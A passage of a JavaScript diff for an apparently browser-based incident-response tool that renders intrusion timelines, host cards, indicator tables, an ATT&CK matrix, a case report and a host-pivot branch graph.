+  $('#stHosts').textContent=S.hosts.length;
+  $('#stComp').textContent=S.hosts.filter(h=>h.status==='compromised').length;
+  $('#stIoc').textContent=Object.keys(iocIndex(evs)).length;
+  $('#stSpan').textContent = evs.length>1 ? humanSpan(evs[evs.length-1].ep-evs[0].ep) : (evs.length?'single event':'—');
+
+  const f=UI.filters;
+  const hs=$('#fHost'); const hv=f.host;
+  hs.innerHTML='<option value="">All hosts</option>'+S.hosts.map(h=>'<option value="'+attr(h.id)+'"'+(h.id===hv?' selected':'')+'>'+esc(h.name)+'</option>').join('');
+  const users={}; evs.forEach(e=>{if(e.user)users[e.user]=1;});
+  const us=$('#fUser');
+  us.innerHTML='<option value="">All accounts</option>'+Object.keys(users).sort().map(u=>'<option value="'+attr(u)+'"'+(u===f.user?' selected':'')+'>'+esc(u)+'</option>').join('');
+  const ts=$('#fTactic');
+  if(ts.options.length<2)
+    ts.innerHTML='<option value="">All tactics</option>'+TACTICS.map(t=>'<option value="'+t.id+'">'+esc(t.name)+'</option>').join('');
+  ts.value=f.tactic;
+  const cc=$('#fConf');
+  if(!cc.children.length)
+    cc.innerHTML=CONFIDENCE.map(c=>'<span class="fchip" data-conf="'+c.id+'" style="--c:'+c.color+'">'+esc(c.label)+'</span>').join('');
+  $$('#fConf .fchip').forEach(el=>el.classList.toggle('on',f.conf.indexOf(el.dataset.conf)>=0));
+  $$('.fchip[data-flag]').forEach(el=>el.classList.toggle('on',f.flags.indexOf(el.dataset.flag)>=0));
+}
+
+function iocIndex(evs){
+  const m={};
+  evs.forEach(e=>{
+    if(!e.indicator) return;
+    const k=e.indicator.trim().toLowerCase();
+    if(!k) return;
+    (m[k]=m[k]||{value:e.indicator,type:e.itype,events:[]}).events.push(e);
+    if(!m[k].type&&e.itype) m[k].type=e.itype;
+  });
+  return m;
+}
+
+/* --------- shared cell renderers --------- */
+function tacticCell(e){
+  const t=tacticOf(e);
+  if(!t) return '<span style="color:var(--dimmer)">—</span>';
+  return '<span class="tac" style="color:'+t.color+'"><i style="background:'+t.color+'"></i>'+esc(t.name)+'</span>'+
+    (e.technique?'<div class="tid">'+esc(techLabel(e))+'</div>':'');
+}
+function confDot(e){
+  const c=CONF_BY_ID[e.conf]||CONF_BY_ID.medium;
+  return '<span class="dot" style="background:'+c.color+';box-shadow:0 0 8px '+c.color+'"></span><span style="color:'+c.color+';font-size:10px;letter-spacing:.08em">'+c.label+'</span>';
+}
+function indCell(e){
+  if(!e.indicator) return '<span style="color:var(--dimmer)">—</span>';
+  return '<span class="ind">'+(e.itype?'<span class="t">'+esc(e.itype)+'</span>':'')+esc(trunc(e.indicator,72))+'</span>';
+}
+function hostCell(e){
+  const h=host(e.hostId);
+  if(!h) return '<span style="color:var(--dimmer)">unassigned</span>';
+  const c=laneColor(h.id);
+  let s='<span style="color:'+c+'">'+esc(h.name)+'</span>';
+  if(e.srcHostId&&e.srcHostId!==e.hostId) s='<span style="color:var(--mg)">'+esc(hostName(e.srcHostId))+' →</span> '+s;
+  return s;
+}
+
+/* ============================ TIMELINE ============================ */
+function renderTimeline(f){
+  const rows=f.map((e,i)=>{
+    const open=UI.expanded[e.id];
+    let r='<tr data-id="'+attr(e.id)+'" class="'+(UI.sel===e.id?'sel ':'')+(e.key?'key':'')+'">'+
+      '<td class="num">'+(i+1)+'</td>'+
+      '<td class="ts">'+fmtTime(e)+'<small>'+fmtDate(e)+(UI.tz==='source'?' '+offsetLabel(+e.off||0):'')+'</small></td>'+
+      '<td>'+hostCell(e)+'</td>'+
+      '<td><span class="usr">'+esc(e.user||'—')+'</span>'+(e.priv?'<div class="prv">'+esc(e.priv)+'</div>':'')+'</td>'+
+      '<td>'+tacticCell(e)+'</td>'+
+      '<td class="tw"><div class="wrap">'+esc(e.activity||'—')+'</div>'+
+        (e.cmd&&!open?'<div class="tid" style="color:var(--vi)">'+esc(trunc(e.cmd.replace(/\s+/g,' '),64))+'</div>':'')+'</td>'+
+      '<td class="tw">'+indCell(e)+'</td>'+
+      '<td>'+confDot(e)+'</td>'+
+      '<td style="white-space:nowrap">'+
+        (e.link?'<a class="src" href="'+attr(e.link)+'" target="_blank" rel="noopener" title="Open source record">↗</a> ':'')+
+        '<button class="btn sm ghost" data-act="edit">Edit</button></td></tr>';
+    if(open){
+      r+='<tr class="expand" data-id="'+attr(e.id)+'"><td colspan="9"><dl class="kv">'+
+        (e.cmd?'<dt>Command</dt><dd><code class="cmd">'+esc(e.cmd)+'</code></dd>':'')+
+        (e.notes?'<dt>Notes</dt><dd class="wrap">'+esc(e.notes)+'</dd>':'')+
+        '<dt>Timestamp</dt><dd>'+fmtTs(e,true)+'  ·  raw <code>'+esc(e.ts)+'</code></dd>'+
+        (e.source?'<dt>Source</dt><dd>'+esc(e.source)+'</dd>':'')+
+        (e.link?'<dt>Link</dt><dd><a class="src" href="'+attr(e.link)+'" target="_blank" rel="noopener">'+esc(trunc(e.link,110))+'</a></dd>':'')+
+        (e.evidence?'<dt>Evidence</dt><dd>'+esc(e.evidence)+'</dd>':'')+
+        (e.srcHostId?'<dt>Pivot</dt><dd style="color:var(--mg)">'+esc(hostLabel(e.srcHostId))+' → '+esc(hostLabel(e.hostId))+'</dd>':'')+
+        '<dt>Severity</dt><dd style="color:'+((SEV_BY_ID[e.sev]||{}).color||'var(--dim)')+'">'+esc((SEV_BY_ID[e.sev]||{}).label||'—')+'</dd>'+
+        ((e.tags||[]).length?'<dt>Tags</dt><dd>'+e.tags.map(t=>'<span class="tag">'+esc(t)+'</span>').join('')+'</dd>':'')+
+        '</dl></td></tr>';
+    }
+    return r;
+  }).join('');
+
+  $('#view-timeline').innerHTML=
+    '<div class="toolbar">'+
+      '<button class="btn pri" data-act="new">+ Add event</button>'+
+      '<div class="seg"><button data-exp="1" class="'+(Object.keys(UI.expanded).length?'on':'')+'">Expand all</button>'+
+      '<button data-exp="0" class="'+(Object.keys(UI.expanded).length?'':'on')+'">Collapse</button></div>'+
+      '<span class="sp"></span>'+
+      '<span style="color:var(--dim);font-size:10px;letter-spacing:.14em">'+f.length+' OF '+S.events.length+' EVENTS</span>'+
+      '<button class="btn ghost" data-act="csv">Export .csv</button>'+
+    '</div>'+
+    (f.length?'<table class="tbl"><thead><tr><th></th><th>Time</th><th>Host</th><th>Account</th>'+
+      '<th>Tactic</th><th>Activity</th><th>Indicator</th><th>Confidence</th><th></th></tr></thead><tbody>'+rows+'</tbody></table>'
+     :emptyState('No events match','Adjust the filters, or add the first observation to start building the timeline.','Add event','new'));
+}
+
+function emptyState(title,body,btn,act){
+  return '<div class="empty"><b>'+esc(title)+'</b><p>'+esc(body)+'</p>'+
+    (btn?'<button class="btn pri" data-act="'+act+'">'+esc(btn)+'</button>':'')+'</div>';
+}
+
+/* ============================ HOSTS ============================ */
+function renderHosts(){
+  if(!S.hosts.length){
+    $('#view-hosts').innerHTML=emptyState('No hosts recorded',
+      'Add the systems involved in the intrusion. Every event you log can be attached to a host, and each host gets its own lane in the branch graph.','Add host','newhost');
+    return;
+  }
+  const cards=S.hosts.map(h=>{
+    const a=hostAgg(h.id), st=HS_BY_ID[h.status]||HS_BY_ID.unknown, lc=laneColor(h.id);
+    const tacBar=a.tactics.map(t=>'<i style="background:'+TAC_BY_ID[t].color+';flex:'+1+'"></i>').join('')||'<i style="background:#111b2c;flex:1"></i>';
+    return '<div class="hcard" data-host="'+attr(h.id)+'" style="border-left:2px solid '+lc+'">'+
+      '<div class="statusflag" style="background:'+st.color+'">'+esc(st.label)+'</div>'+
+      '<h4>'+esc(h.name)+'</h4>'+
+      '<div class="ipl">'+esc(h.ip||'no address recorded')+'</div>'+
+      '<div class="meta">'+esc([h.os,h.role,h.zone].filter(Boolean).join(' · ')||'—')+'</div>'+
+      '<div class="bar">'+tacBar+'</div>'+
+      '<div class="hstats">'+
+        '<div><b>'+a.count+'</b><span>Events</span></div>'+
+        '<div><b>'+a.users.length+'</b><span>Accounts</span></div>'+
+        '<div><b>'+a.iocs+'</b><span>Indicators</span></div>'+
+      '</div>'+
+      '<div class="meta" style="margin-top:9px">'+
+        (a.first?'First activity '+fmtParts(a.first,UI.tz==='local'?browserOffset(a.first):0).date+' '+fmtParts(a.first,UI.tz==='local'?browserOffset(a.first):0).time:'No activity logged')+
+        (a.first&&a.last&&a.last!==a.first?'<br>Active for '+humanSpan(a.last-a.first):'')+
+        (a.outbound?'<br><span style="color:var(--mg)">'+a.outbound+' outbound pivot(s)</span>':'')+
+      '</div>'+
+      (a.users.length?'<div style="margin-top:8px">'+a.users.slice(0,4).map(u=>'<span class="tag" style="color:var(--gr);border-color:rgba(77,255,154,.35)">'+esc(u)+'</span>').join('')+(a.users.length>4?'<span class="tag">+'+(a.users.length-4)+'</span>':'')+'</div>':'')+
+      ((h.tags||[]).length?'<div style="margin-top:5px">'+h.tags.map(t=>'<span class="tag">'+esc(t)+'</span>').join('')+'</div>':'')+
+      (h.notes?'<div class="meta" style="margin-top:8px;color:var(--dimmer)">'+esc(trunc(h.notes,150))+'</div>':'')+
+    '</div>';
+  }).join('');
+  $('#view-hosts').innerHTML=
+    '<div class="toolbar"><button class="btn pri" data-act="newhost">+ Add host</button>'+
+    '<span class="sp"></span><span style="color:var(--dim);font-size:10px;letter-spacing:.14em">CLICK A CARD TO EDIT</span></div>'+
+    '<div class="hostgrid">'+cards+'</div>';
+}
+
+/* ============================ INDICATORS ============================ */
+function renderPivot(f){
+  const idx=iocIndex(f);
+  const keys=Object.keys(idx).sort((a,b)=>idx[b].events.length-idx[a].events.length||a.localeCompare(b));
+  if(!keys.length){
+    $('#view-pivot').innerHTML=emptyState('No indicators yet',
+      'Indicators you attach to events are collected here, deduplicated, with every place each one was observed.','Add event','new');
+    return;
+  }
+  const rows=keys.map(k=>{
+    const g=idx[k], evs=g.events;
+    const hosts={}; const users={};
+    evs.forEach(e=>{if(e.hostId)hosts[e.hostId]=1;if(e.user)users[e.user]=1;});
+    const hk=Object.keys(hosts);
+    const open=UI.expanded['ioc:'+k];
+    let r='<tr data-ioc="'+attr(k)+'"><td class="tw"><span class="ind">'+esc(g.value)+'</span></td>'+
+      '<td><span class="badge" style="color:var(--vi)">'+esc(g.type||'unclassified')+'</span></td>'+
+      '<td style="text-align:center;color:var(--cy)">'+evs.length+'</td>'+
+      '<td>'+(hk.length?hk.map(id=>'<span class="tag" style="color:'+laneColor(id)+';border-color:currentColor">'+esc(hostName(id))+'</span>').join(''):'—')+'</td>'+
+      '<td>'+(Object.keys(users).map(u=>esc(u)).join(', ')||'—')+'</td>'+
+      '<td class="ts">'+fmtTime(evs[0])+'<small>'+fmtDate(evs[0])+'</small></td>'+
+      '<td class="ts">'+fmtTime(evs[evs.length-1])+'<small>'+fmtDate(evs[evs.length-1])+'</small></td></tr>';
+    if(open){
+      r+='<tr class="expand"><td colspan="7">'+
+        evs.map(e=>'<div style="display:flex;gap:12px;padding:4px 0;border-bottom:1px solid rgba(120,200,255,.07)">'+
+          '<span class="ts" style="flex:0 0 150px">'+fmtTs(e)+'</span>'+
+          '<span style="flex:0 0 130px">'+hostCell(e)+'</span>'+
+          '<span style="flex:1">'+esc(e.activity||'—')+'</span>'+
+          (e.link?'<a class="src" href="'+attr(e.link)+'" target="_blank" rel="noopener">↗</a>':'')+
+        '</div>').join('')+'</td></tr>';
+    }
+    return r;
+  }).join('');
+  $('#view-pivot').innerHTML=
+    '<div class="toolbar"><span style="color:var(--dim);font-size:10px;letter-spacing:.14em">'+keys.length+' UNIQUE INDICATORS · CLICK TO SEE EVERY SIGHTING</span>'+
+    '<span class="sp"></span><button class="btn ghost" data-act="ioccsv">Export indicator list</button></div>'+
+    '<table class="tbl"><thead><tr><th>Indicator</th><th>Type</th><th>Hits</th><th>Seen on</th><th>Accounts</th><th>First seen</th><th>Last seen</th></tr></thead><tbody>'+rows+'</tbody></table>';
+}
+
+/* ============================ ATT&CK MATRIX ============================ */
+function renderMatrix(f){
+  const hits={}; f.forEach(e=>{if(e.technique)hits[e.technique]=(hits[e.technique]||0)+1;
+    if(e.tactic)hits['TAC:'+e.tactic]=(hits['TAC:'+e.tactic]||0)+1;});
+  const only=UI.matrixOnly;
+  const cols=TACTICS.map(t=>{
+    let cells=t.tech.filter(p=>!only||hits[p[0]]).map(p=>{
+      const n=hits[p[0]];
+      return '<div class="mcell'+(n?' hit':'')+'" title="'+attr(p[0]+' '+p[1])+'">'+
+        (n?'<span class="c">'+n+'</span>':'')+'<b>'+p[0]+'</b>'+esc(p[1])+'</div>';
+    }).join('');
+    if(!cells) cells='<div class="mcell" style="opacity:.35">—</div>';
+    return '<div class="mcol"><h5 style="color:'+t.color+'">'+esc(t.name)+
+      (hits['TAC:'+t.id]?' <span style="float:right;color:var(--mg)">'+hits['TAC:'+t.id]+'</span>':'')+'</h5>'+cells+'</div>';
+  }).join('');
+  const observed=Object.keys(hits).filter(k=>k.indexOf('TAC:')!==0).length;
+  $('#view-matrix').innerHTML=
+    '<div class="toolbar">'+
+      '<div class="seg"><button data-mx="0" class="'+(only?'':'on')+'">Full matrix</button>'+
+      '<button data-mx="1" class="'+(only?'on':'')+'">Observed only</button></div>'+
+      '<span class="sp"></span>'+
+      '<span style="color:var(--dim);font-size:10px;letter-spacing:.14em">'+observed+' TECHNIQUES OBSERVED ACROSS '+
+      TACTICS.filter(t=>hits['TAC:'+t.id]).length+' TACTICS</span>'+
+    '</div><div class="matrix">'+cols+'</div>';
+}
+
+/* ============================ REPORT ============================ */
+function reportModel(){
+  const evs=S.events.slice();
+  const first=evs[0], last=evs[evs.length-1];
+  const comp=S.hosts.filter(h=>h.status==='compromised');
+  const tech={}; evs.forEach(e=>{if(e.technique)tech[e.technique]=(tech[e.technique]||0)+1;});
+  const key=evs.filter(e=>e.key);
+  const iocs=iocIndex(evs);
+  return {evs,first,last,comp,tech,key,iocs};
+}
+function renderReport(){
+  const c=S.case, m=reportModel();
+  if(!m.evs.length&&!S.hosts.length){
+    $('#view-report').innerHTML=emptyState('Nothing to report yet','The report assembles itself from the hosts and events you record. Add something to the timeline first.','Add event','new');
+    return;
+  }
+  const span=m.first&&m.last?humanSpan(m.last.ep-m.first.ep):'—';
+  let h='<div class="toolbar"><button class="btn" data-act="case">Edit case details</button>'+
+    '<span class="sp"></span>'+
+    '<button class="btn ghost" data-act="md">Download .md</button>'+
+    '<button class="btn ghost" data-act="csv">Download .csv</button>'+
+    '<button class="btn ghost" data-act="print">Print</button></div><div class="report">';
+  h+='<h1>'+esc(c.name||'Untitled investigation')+(c.number?' · '+esc(c.number):'')+'</h1>';
+  h+='<p style="color:var(--dim);font-family:var(--mono);font-size:11px;letter-spacing:.08em">'+
+     [c.classification,c.analyst?'Lead: '+c.analyst:'','Generated '+fmtParts(Date.now(),UI.tz==='local'?browserOffset():0).date+' '+fmtParts(Date.now(),UI.tz==='local'?browserOffset():0).time+' '+(UI.tz==='local'?offsetLabel(browserOffset()):'UTC')]
+     .filter(Boolean).map(esc).join(' &nbsp;·&nbsp; ')+'</p>';
+
+  h+='<h2>Summary</h2>';
+  h+=c.summary?'<p>'+esc(c.summary).replace(/\n/g,'<br>')+'</p>':'<p style="color:var(--dim)"><i>No summary written yet — use “Edit case details”.</i></p>';
+  h+='<ul>'+
+    '<li><b>'+m.evs.length+'</b> events recorded across <b>'+S.hosts.length+'</b> hosts.</li>'+
+    (m.first?'<li>Earliest observed activity <code>'+fmtTs(m.first,true)+'</code> on <b>'+esc(hostName(m.first.hostId))+'</b>'+(m.first.activity?' — '+esc(m.first.activity):'')+'.</li>':'')+
+    (m.last?'<li>Latest observed activity <code>'+fmtTs(m.last,true)+'</code>, an observed span of <b>'+span+'</b>.</li>':'')+
+    (m.comp.length?'<li>Confirmed compromised: '+m.comp.map(x=>'<b>'+esc(x.name)+'</b>').join(', ')+'.</li>':'')+
+    '<li><b>'+Object.keys(m.tech).length+'</b> distinct ATT&amp;CK techniques and <b>'+Object.keys(m.iocs).length+'</b> unique indicators.</li>'+
+    '</ul>';
+
+  if(m.key.length){
+    h+='<h2>Key events</h2><ul>';
+    m.key.forEach(e=>{h+='<li><code>'+fmtTs(e)+'</code> — <b>'+esc(hostName(e.hostId))+'</b> · '+esc(e.activity||e.indicator||'')+
+      (e.technique?' <span style="color:var(--dim)">('+esc(e.technique)+')</span>':'')+'</li>';});
+    h+='</ul>';
+  }
+
+  if(S.hosts.length){
+    h+='<h2>Affected systems</h2><table><thead><tr><th>Host</th><th>Address</th><th>Function</th><th>Status</th><th>Events</th><th>First seen</th><th>Last seen</th></tr></thead><tbody>';
+    S.hosts.forEach(x=>{const a=hostAgg(x.id);const st=HS_BY_ID[x.status]||HS_BY_ID.unknown;
+      h+='<tr><td><b>'+esc(x.name)+'</b></td><td>'+esc(x.ip||'—')+'</td><td>'+esc(x.role||'—')+'</td>'+
+      '<td style="color:'+st.color+'">'+esc(st.label)+'</td><td>'+a.count+'</td>'+
+      '<td>'+(a.first?fmtParts(a.first,0).date+' '+fmtParts(a.first,0).time:'—')+'</td>'+
+      '<td>'+(a.last?fmtParts(a.last,0).date+' '+fmtParts(a.last,0).time:'—')+'</td></tr>';});
+    h+='</tbody></table>';
+  }
+
+  h+='<h2>Timeline</h2><table><thead><tr><th>Time</th><th>Host</th><th>Account</th><th>Technique</th><th>Activity</th><th>Confidence</th></tr></thead><tbody>';
+  m.evs.forEach(e=>{
+    h+='<tr><td style="white-space:nowrap">'+fmtTs(e)+'</td><td>'+esc(hostName(e.hostId))+
+      (e.srcHostId?'<br><span style="color:var(--mg)">← '+esc(hostName(e.srcHostId))+'</span>':'')+'</td>'+
+      '<td>'+esc(e.user||'—')+(e.priv?'<br><span style="color:var(--rd)">'+esc(e.priv)+'</span>':'')+'</td>'+
+      '<td>'+esc(e.technique||'—')+(e.tactic?'<br><span style="color:'+TAC_BY_ID[e.tactic].color+'">'+esc(TAC_BY_ID[e.tactic].name)+'</span>':'')+'</td>'+
+      '<td>'+esc(e.activity||'—')+(e.cmd?'<br><code>'+esc(trunc(e.cmd.replace(/\s+/g,' '),120))+'</code>':'')+'</td>'+
+      '<td>'+esc((CONF_BY_ID[e.conf]||{}).label||'—')+'</td></tr>';
+  });
+  h+='</tbody></table>';
+
+  const ik=Object.keys(m.iocs);
+  if(ik.length){
+    h+='<h2>Indicators of compromise</h2><table><thead><tr><th>Type</th><th>Indicator</th><th>Sightings</th><th>Hosts</th></tr></thead><tbody>';
+    ik.sort((a,b)=>m.iocs[b].events.length-m.iocs[a].events.length).forEach(k=>{
+      const g=m.iocs[k], hs={};g.events.forEach(e=>{if(e.hostId)hs[e.hostId]=1;});
+      h+='<tr><td>'+esc(g.type||'—')+'</td><td>'+esc(g.value)+'</td><td>'+g.events.length+'</td><td>'+
+        Object.keys(hs).map(id=>esc(hostName(id))).join(', ')+'</td></tr>';
+    });
+    h+='</tbody></table>';
+  }
+  h+='</div>';
+  $('#view-report').innerHTML=h;
+}
+/* ============================ BRANCH GRAPH ============================ */
+const G = {PAD:32, LW:46, ROW:52, MIN:38, TOP:48, DAY:34, R:6};
+
+function laneList(f){
+  const seen=[];
+  const push=id=>{const k=id||'__none';if(seen.indexOf(k)<0)seen.push(k);};
+  f.forEach(e=>{ if(e.srcHostId) push(e.srcHostId); push(e.hostId); });
+  if(UI.laneAll) S.hosts.forEach(h=>push(h.id));
+  return seen;
+}
+function laneMeta(key){
+  if(key==='__none') return {name:'(unassigned)',ip:'',color:'#44576b'};
+  const h=host(key);
+  return h?{name:h.name,ip:h.ip,color:laneColor(h.id),status:h.status}:{name:'(deleted host)',ip:'',color:'#44576b'};
+}
+function layoutY(f){
+  const ys=[], breaks=[];
+  let lastDay='', shift=0, prev=-1e9;
+  const t0=f[0].ep, t1=f[f.length-1].ep, span=Math.max(1,t1-t0);
+  const H=Math.max(f.length*G.ROW,520);
+  f.forEach((e,i)=>{
+    const day=fmtDate(e), newDay=day!==lastDay;
+    if(newDay && i>0) shift+=G.DAY;
+    let y = UI.gmode==='seq' ? G.TOP+i*G.ROW+shift
+                             : G.TOP+((e.ep-t0)/span)*H+shift;
+    const floor = prev + (newDay&&i>0 ? G.MIN+G.DAY : G.MIN);
+    if(y<floor) y=floor;
+    prev=y; ys.push(y);
+    if(newDay){ lastDay=day; breaks.push({y:Math.round(y-26), label:day}); }
+  });
+  return {ys:ys, breaks:breaks};
+}
+
+function renderGraph(f){
+  const el=$('#view-graph');
+  const bar='<div class="toolbar" style="padding:12px 14px 0;margin-bottom:8px">'+
+    '<button class="btn pri" data-act="new">+ Add event</button>'+
+    '<div class="seg"><button data-g="seq" class="'+(UI.gmode==='seq'?'on':'')+'">Sequence</button>'+
+    '<button data-g="time" class="'+(UI.gmode==='time'?'on':'')+'">Time-scaled</button></div>'+
+    '<label class="ck" style="margin-left:4px"><input type="checkbox" id="gAll"'+(UI.laneAll?' checked':'')+'> Show every host lane</label>'+
+    '<span class="sp"></span>'+
+    '<span style="color:var(--dim);font-size:10px;letter-spacing:.14em">'+f.length+' EVENTS · '+
+      (UI.tz==='utc'?'UTC':UI.tz==='local'?'LOCAL TIME':'SOURCE TIME')+'</span></div>';
+
+  if(!f.length){
+    if(S.events.length){
+      el.innerHTML=bar+emptyState('Nothing matches these filters',
+        'All '+S.events.length+' events are filtered out. Widen the filters to bring the graph back.','Clear filters','clearf');
+    }else{
+      el.innerHTML=bar+
+        '<div class="empty" style="min-height:62vh"><b>No investigation loaded</b>'+
+        '<p>Events assemble here as one lane per host, ordered by when the attacker first reached each system, '+
+        'with a branch drawn wherever activity pivoted from one host to another. Nothing leaves this page.</p>'+
+        '<div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center">'+
+        '<button class="btn pri" data-act="new">Add first event</button>'+
+        '<button class="btn" data-act="newhost">Add a host</button>'+
+        '<button class="btn ghost" data-act="demo">Load example case</button></div>'+
+        '<p style="color:var(--dimmer)">The example walks a phishing-to-ransomware intrusion across five hosts — '+
+        'a quick way to see how the graph, indicators and report fit together.</p></div>';
+    }
+    return;
+  }
+
+  const lanes=laneList(f);
+  const lx={}; lanes.forEach((k,i)=>lx[k]=G.PAD+i*G.LW);
+  const L=layoutY(f), ys=L.ys;
+  const graphW=G.PAD+lanes.length*G.LW+10;
+  const H=ys[ys.length-1]+70;
+
+  /* lane extents + per-lane event order */
+  const laneEvents={}; lanes.forEach(k=>laneEvents[k]=[]);
+  f.forEach((e,i)=>{const k=e.hostId||'__none'; if(laneEvents[k]) laneEvents[k].push(i);});
+
+  let svg='<svg class="gsvg" width="'+graphW+'" height="'+H+'" viewBox="0 0 '+graphW+' '+H+'">'+
+    '<defs><marker id="mArrow" viewBox="0 0 8 8" refX="6" refY="4" markerWidth="6" markerHeight="6" orient="auto">'+
+    '<path d="M0,0 L8,4 L0,8 z" fill="#ff2e88"/></marker></defs>';
+
+  /* faint full-height guides */
+  lanes.forEach(k=>{
+    svg+='<line x1="'+lx[k]+'" y1="0" x2="'+lx[k]+'" y2="'+H+'" stroke="'+laneMeta(k).color+'" stroke-opacity=".09" stroke-width="1"/>';
+  });
+  /* active spines */
+  lanes.forEach(k=>{
+    const idx=laneEvents[k]; if(!idx.length) return;
+    const y1=ys[idx[0]], y2=ys[idx[idx.length-1]], c=laneMeta(k).color, x=lx[k];
+    svg+='<line x1="'+x+'" y1="'+y1+'" x2="'+x+'" y2="'+y2+'" stroke="'+c+'" stroke-opacity=".18" stroke-width="7" stroke-linecap="round"/>'+
+         '<line x1="'+x+'" y1="'+y1+'" x2="'+x+'" y2="'+y2+'" stroke="'+c+'" stroke-opacity=".85" stroke-width="1.6"/>'+
+         '<circle cx="'+x+'" cy="'+(y1-14)+'" r="2.5" fill="'+c+'" fill-opacity=".8"/>'+
+         '<line x1="'+(x-4)+'" y1="'+(y2+13)+'" x2="'+(x+4)+'" y2="'+(y2+13)+'" stroke="'+c+'" stroke-opacity=".6" stroke-width="1.6"/>';
+  });
+  /* pivot branches */
+  f.forEach((e,i)=>{
+    if(!e.srcHostId) return;
+    const dk=e.hostId||'__none', sk=e.srcHostId;
+    if(sk===dk || lx[sk]===undefined || lx[dk]===undefined) return;
+    const y=ys[i], sx=lx[sk], dx=lx[dk];
+    let ay=null;
+    (laneEvents[sk]||[]).forEach(j=>{ if(ys[j]<=y) ay=ys[j]; });
+    if(ay===null) ay=Math.max(0,y-G.ROW);
+    const c1=ay+(y-ay)*.55, c2=y-(y-ay)*.42;
+    svg+='<path d="M'+sx+','+ay+' C'+sx+','+c1+' '+dx+','+c2+' '+dx+','+(y-G.R-3)+'" fill="none" '+
+      'stroke="#ff2e88" stroke-width="1.5" stroke-dasharray="5 3" stroke-opacity=".9" marker-end="url(#mArrow)"/>'+
+      '<circle cx="'+sx+'" cy="'+ay+'" r="3" fill="#ff2e88"/>';
+  });
+  /* nodes */
+  f.forEach((e,i)=>{
+    const k=e.hostId||'__none', x=lx[k], y=ys[i];
+    if(x===undefined) return;
+    const lc=laneMeta(k).color, t=tacticOf(e), fill=t?t.color:'#0d1524';
+    const r=e.key?G.R+2:G.R;
+    if(UI.sel===e.id)
+      svg+='<circle cx="'+x+'" cy="'+y+'" r="'+(r+7)+'" fill="none" stroke="#22e8ff" stroke-width="1.2" stroke-opacity=".9"/>';
+    if(e.key)
+      svg+='<circle cx="'+x+'" cy="'+y+'" r="'+(r+4)+'" fill="none" stroke="#ffb020" stroke-width="1.2" stroke-dasharray="2 3"/>';
+    svg+='<circle cx="'+x+'" cy="'+y+'" r="'+(r+3)+'" fill="'+fill+'" fill-opacity=".22"/>'+
+         '<circle cx="'+x+'" cy="'+y+'" r="'+r+'" fill="'+fill+'" stroke="'+lc+'" stroke-width="2"/>'+
+         '<circle class="hit" data-id="'+attr(e.id)+'" cx="'+x+'" cy="'+y+'" r="15" fill="transparent"><title>'+
+         attr(fmtTs(e,true)+'\n'+hostName(e.hostId)+(e.user?'  ·  '+e.user:'')+'\n'+(e.activity||e.indicator||''))+'</title></circle>';
+  });
+  svg+='</svg>';
+
+  /* day separators, each sitting in the gap opened up for it */
+  let seps='';
+  L.breaks.forEach(b=>{
+    seps+='<div class="daysep" style="top:'+b.y+'px"></div>'+
+          '<div class="daylbl" style="top:'+(b.y-7)+'px;left:'+(graphW+10)+'px">'+esc(b.label)+'</div>';
+  });
+
+  /* text column */
+  const rows=f.map((e,i)=>{
+    const t=tacticOf(e);
+    return '<div class="grow'+(UI.sel===e.id?' sel':'')+'" data-id="'+attr(e.id)+'" style="top:'+(ys[i]-17)+'px">'+
+      '<span class="gt">'+fmtTime(e)+'</span>'+
+      (t?'<span class="badge" style="color:'+t.color+';font-size:9px">'+esc(t.short)+'</span>':'')+
+      '<span class="ga">'+esc(e.activity||e.indicator||'(no description)')+'</span>'+
+      (e.user?'<span class="gu">'+esc(trunc(e.user,26))+'</span>':'')+
+      (e.indicator&&e.activity?'<span class="gi">'+esc(e.indicator)+'</span>':'')+
+      (e.link?'<a class="src" href="'+attr(e.link)+'" target="_blank" rel="noopener" title="Open source record">↗</a>':'')+
+    '</div>';
+  }).join('');
+
+  /* lane headers */
+  const heads=lanes.map(k=>{
+    const m=laneMeta(k);
+    return '<div class="lanelbl" title="'+attr(m.name+(m.ip?' · '+m.ip:''))+'" style="left:'+(lx[k]+4)+'px;color:'+m.color+'"><b>'+esc(trunc(m.name,20))+'</b>'+
+      (m.ip?'<s>'+esc(m.ip)+'</s>':'')+'</div>'+
+      '<div style="position:absolute;bottom:0;left:'+(lx[k]-3)+'px;width:6px;height:6px;background:'+m.color+'"></div>';
+  }).join('');
+
+  /* legend */
+  const used={}; f.forEach(e=>{if(e.tactic)used[e.tactic]=1;});
+  const legend='<div class="legend">'+
+    Object.keys(used).map(id=>'<span class="li"><i style="width:9px;height:9px;background:'+TAC_BY_ID[id].color+';display:block;transform:rotate(45deg)"></i>'+esc(TAC_BY_ID[id].name)+'</span>').join('')+
+    '<span class="li" style="color:var(--mg)"><svg width="26" height="8"><line x1="0" y1="4" x2="26" y2="4" stroke="#ff2e88" stroke-width="1.5" stroke-dasharray="5 3"/></svg>Pivot between hosts</span>'+
+    '<span class="li" style="color:var(--am)">◌ Key event</span>'+
+    '</div>';
+
+  el.innerHTML=bar+
+    '<div style="min-width:'+(graphW+560)+'px">'+
+    '<div class="lanehead" style="height:120px">'+heads+'</div>'+
+    '<div class="gbody" style="height:'+H+'px">'+
+      '<div class="seps">'+seps+'</div>'+svg+
+      '<div class="rows" style="margin-left:'+graphW+'px;height:'+H+'px;min-width:520px">'+rows+'</div>'+
+    '</div></div>'+
+    inspectorHTML()+legend;
+}
+
+function inspectorHTML(){
+  const e=S.events.find(x=>x.id===UI.sel);
+  if(!e) return '';
+  const t=tacticOf(e), c=CONF_BY_ID[e.conf]||{}, s=SEV_BY_ID[e.sev]||{};
+  return '<div class="inspector">'+
+    '<div class="ihead">'+
+      (t?'<span class="tac" style="color:'+t.color+'"><i style="background:'+t.color+'"></i>'+esc(t.short)+'</span>':'')+
+      '<b>'+esc(e.activity||e.indicator||'Event')+'</b>'+
+      '<span class="sp"></span>'+
+      '<span style="color:'+(c.color||'var(--dim)')+';font-size:10px;letter-spacing:.1em">'+esc(c.label||'')+'</span>'+
+      '<button class="btn sm" data-act="edit" data-id="'+attr(e.id)+'">Edit</button>'+
+      '<button class="btn sm ghost" data-act="close">✕</button>'+
+    '</div>'+
+    '<dl class="kv">'+
+      '<dt>Time</dt><dd>'+fmtTs(e,true)+'</dd>'+
+      '<dt>Host</dt><dd>'+esc(hostLabel(e.hostId))+(e.srcHostId?' <span style="color:var(--mg)">← pivot from '+esc(hostName(e.srcHostId))+'</span>':'')+'</dd>'+
